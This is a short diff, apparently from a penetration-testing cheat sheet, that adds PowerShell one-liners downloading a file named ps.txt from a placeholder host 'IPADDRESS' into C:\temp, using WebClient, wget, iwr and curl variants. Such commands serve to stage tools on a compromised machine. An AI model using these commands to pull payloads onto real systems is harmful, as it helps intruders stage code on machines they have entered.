@@ -3,3 +3,5 @@ powershell.exe –Command "& {(New-Object Net.WebClient).DownloadFile('http://IP
 
 #Powershell 3.0 or greater
 powershell.exe -Command "& {wget 'http://IPADDRESS/ps.txt' -OutFile 'C:\temp\ps.txt'}"
+powershell.exe -Command "& {iwr 'http://IPADDRESS/ps.txt' -Outfile 'C:\temp\ps.txt'}"
+powershell.exe -Command "& {curl 'http://IPADDRESS/ps.txt' -Outfile 'C:\temp\ps.txt'}"
